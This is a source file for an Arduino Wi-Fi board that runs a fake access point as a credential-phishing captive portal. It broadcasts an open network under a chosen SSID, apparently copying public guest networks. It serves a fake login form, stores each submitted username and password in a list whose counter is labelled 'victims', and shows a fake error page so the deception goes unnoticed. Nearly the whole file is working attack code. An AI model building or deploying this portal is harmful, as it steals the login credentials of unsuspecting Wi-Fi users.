#include <WiFiNINA.h>

#include "dnsSettings.h"
#include "Logger.h"

class APFakerStruct
{
  public:
    char shortName[20];   // name displayed for reference
    char ssid[20];        // your network SSID (name)
    char pass[20];        // your network password (use for WPA, or use as key for WEP)
    uint8_t keyIndex;         // your network key Index number (needed only for WEP)
    bool operator!=(APFakerStruct comp){
      return strcmp(ssid, comp.ssid) != 0 || strcmp(pass, comp.pass) != 0 || (keyIndex != comp.keyIndex);
    }
    APFakerStruct* next;
} currentAPFaker, emptyAPFaker = { "", "", "", 0, NULL };

enum CODE_RETURN {
  CS_SUCCESS = 0,
  CS_ERROR_WIFI_STATUS,
  CS_WARNING_FIRMWARE_VERSION,
  CS_ERROR_AP_INITIALIZATION
};

int clientCount = 0;
String connectedIP = F("");

enum METRICS {
  MTR_VICTIMS = 0,
  MTR_CLIENTS,
  MTR_TOTAL,
  MTR_MAX_ELEM
};

/*****************************************
 * Available Faker AP listed in the HOME
 */
uint8_t numberOfAP = 0;
APFakerStruct *AvailableAP; /*[2] = {
  { "Maximo", "WiFi Maximo Guest 2", "", 0 },
  { "Euroma2", "WiFi Euroma2 Guest", "", 0 }
}; */

/**********************************
 * In this array will be recorded the 
 * credentials leaves by the victims
 */
String ResultList[200];

/**********************************
 * In this array will be recorded the 
 * statistics to show in the status 
 * screen (look the totalRecords variable)
 */
int MetricsData[MTR_MAX_ELEM];

uint8_t status = WL_IDLE_STATUS;
WiFiServer server(80);

IPAddress GetIPAddress() {
  return WiFi.localIP();
}

APFakerStruct* GetAPFaker(uint8_t numel){
  APFakerStruct* el = AvailableAP;
  for (size_t i = 0; i < numel; i++)
  {
    el = el->next;
  }
  return el;
}

String IpAddressAsString(IPAddress ipAddress)
{
  return String(ipAddress[0]) + String(".") +
         String(ipAddress[1]) + String(".") +
         String(ipAddress[2]) + String(".") +
         String(ipAddress[3]);
}

CODE_RETURN setupAPFaker() {
  for(uint8_t i = 0; i < MTR_MAX_ELEM; i++)
    MetricsData[i] = 0;

  // check for the WiFi module:
  if (WiFi.status() == WL_NO_MODULE) {
    return CS_ERROR_WIFI_STATUS;
  }

  currentAPFaker = emptyAPFaker;

  if (WiFi.firmwareVersion() < WIFI_FIRMWARE_LATEST_VERSION) {
    return CS_WARNING_FIRMWARE_VERSION;
  }

  WiFi.config(apip,apip,gwip,IPAddress(255,255,255,0));

  return CS_SUCCESS;
}

CODE_RETURN InitializationAP(APFakerStruct apf) {
  Logger::WriteLog(LOG_INFO, "Start to initialize the AP faker [" + String(apf.ssid) + "]!");
  // Create open network. Change this line if you want to create an WEP network:
  status = WiFi.beginAP(apf.ssid);
  if (status != WL_AP_LISTENING) {
    return CS_ERROR_AP_INITIALIZATION;
  }
  delay(10000);

  Udp.begin(udpPort);
  server.begin();

  currentAPFaker = apf;

  Logger::WriteLog(LOG_INFO, "Initialization DONE. AP faker [" + String(apf.ssid) + "] available at Address IP [" + IpAddressAsString(GetIPAddress()) + "]!");

  return CS_SUCCESS;
}

void StopAP(){
  Logger::WriteLog(LOG_INFO, F("Stopping the AP faker!"));
  WiFi.end();
  currentAPFaker = emptyAPFaker;
}

unsigned long lastTime = 0;

void CheckForNewDevices() {
  // compare the previous status to the current status
  if (status != WiFi.status()) {
    // it has changed update the variable
    status = WiFi.status();

    if (status == WL_AP_CONNECTED) {
      // a device has connected to the AP
      MetricsData[MTR_CLIENTS]++; // increment the current connected Device
      MetricsData[MTR_TOTAL]++; // increment the total connected Device
      Logger::WriteLog(LOG_INFO, F("Device connected to AP!"));
    } else {
      // a device has disconnected from the AP, and we are back in listening mode
      MetricsData[MTR_CLIENTS]--; // decrement the current connected Device
      Logger::WriteLog(LOG_INFO, F("Device disconnected from AP!"));
    }
  }
}

void ProvideLogInPageToClient(WiFiClient client, String page){
  Logger::WriteLog(LOG_INFO, "Sending page " + page + " to " + IpAddressAsString(client.remoteIP()) + " started!");
  
  client.println(F("HTTP/1.1 200 OK"));
  client.println(F("Content-type:text/html"));
  client.println();
  client.print(page);
  client.print(F("<form method=\"POST\" action=\"/L\">"));
  client.print(F("<label for=\"uname\"><b>Username</b></label>"));
  client.print(F("<input type=\"text\" placeholder=\"Enter Username\" name=\"uname\" required><br />"));
  client.print(F("<label for=\"psw\"><b>Password</b></label>"));
  client.print(F("<input type=\"password\" placeholder=\"Enter Password\" name=\"psw\" required><br />"));
  client.print(F("<button type=\"submit\">Login</button><br />"));
  client.print(F("</form><br>"));
  client.print(F("Click <a href=\"/R\">here</a> to register<br>"));
  client.print(F("Click <a href=\"/F\">here</a> to recover password<br>"));
  client.println();

  Logger::WriteLog(LOG_INFO, "Sending page " + page + " completed!");
}

void ProvideErrorPageToClient(WiFiClient client, String message){
  Logger::WriteLog(LOG_INFO, F("Sending ERROR page started!"));
  
  client.println(F("HTTP/1.1 200 OK"));
  client.println(F("Content-type:text/html"));
  client.println();
  client.print(F("<div><h1>Webservice currently unavailable</h1>"));
  client.print(F("<p class=\"lead\">"));
  client.print(message);
  client.print(F("</p></div>"));
  client.println();

  Logger::WriteLog(LOG_INFO, F("Sending ERROR page completed!"));
}

/*
String GetRequest(WiFiClient client){
  unsigned char* buffer = (unsigned char*)malloc(sizeof(unsigned char)*100);
  int charnum = client.read(buffer, 4096);
  String request = "";
  int i = 0;
  while (buffer[i] != '\n') {
    request += (char)(buffer[i]);
    i++;
  }
  return request;
}
 */

String currentLine, credential;
char c;
void APFakerClientLoopManager(){
  WiFiClient client = server.available();   // listen for incoming clients
  if (client) {                             // if you get a client,
    Logger::WriteLog(LOG_INFO, F("New CLIENT!"));
    currentLine = F("");                // make a String to hold incoming data from the client
    while (client.connected()) {            // loop while the client's connected
      if (client.available()) {             // if there's bytes to read from the client,
        c = client.read();                  // read a byte, then
        Serial.write(c);                    // print it out the serial monitor
        if (c == '\n') {                    // if the byte is a newline character
          // if the current line is blank, you got two newline characters in a row.
          // that's the end of the client HTTP request, so send a response:
          if (currentLine.length() == 0) {
            ProvideLogInPageToClient(client, "LOGIN PAGE for " + String(currentAPFaker.ssid));
            break;
          }
          else {      // if you got a newline, then clear currentLine:
            currentLine = F("");
          }
        }
        else if (c != '\r') {    // if you got anything else but a carriage return character,
          currentLine += c;      // add it to the end of the currentLine
        }        
        if (currentLine.endsWith(F("POST /L"))) {
          credential = F("");
          while ((c = client.read()) != 255)
          {
            if (c != '\n')
              credential += c;
            else
              credential = F("");
            Serial.write(c);
          }
          credential.replace(F("uname="), F(""));
          credential.replace(F("&psw="), F(":"));
          ResultList[MetricsData[MTR_VICTIMS]] = credential;
          MetricsData[MTR_VICTIMS]++;
          RecordCredentials(credential);
          Logger::WriteLog(LOG_INFO, "New credential: [" + credential + "]!");
          ProvideErrorPageToClient(client, F("We're sorry there was a problem logging in.<br />Try again later or connect to another Access Point among those available."));
          // Siamo spiacenti si è verificato un problema durante il login.<br />Riprovare più tardi o connettersi a un altro Access Point tra quelli disponibili.
          break;
        }
        if (currentLine.endsWith("GET /R")) {
          ProvideErrorPageToClient(client, F("We're sorry there was a problem.<br />The registration page is currently unavailable.<br />Please try again later or connect to another Access Point among those available.<br />We apologize for the inconvenience."));
          // Siamo spiacenti si è verificato un problema.<br />La pagina di registrazione non è al momento disponibile.<br />Siete pregati di riprovare più tardi o connettersi a un altro Access Point tra quelli disponibili.<br />Ci scusiamo per il disservizio.
          break;
        }
        if (currentLine.endsWith("GET /F")) {
          ProvideErrorPageToClient(client, F("We're sorry there was a problem.<br />The credentials recovery page is currently unavailable.<br />Please try again later or connect to another Access Point among those available.<br />We apologize for the inconvenience."));
          // Siamo spiacenti si è verificato un problema.<br />La pagina del recupero delle credenziali non è al momento disponibile.<br />Siete pregati di riprovare più tardi o connettersi a un altro Access Point tra quelli disponibili.<br />Ci scusiamo per il disservizio.
          break;
        }
      }
    }
    Logger::WriteLog(LOG_INFO, F("disconnecting CLIENT!"));
    // close the connection:
    client.stop();
    Logger::WriteLog(LOG_INFO, F("CLIENT disconnected!"));
  }
  else udpScan();
}
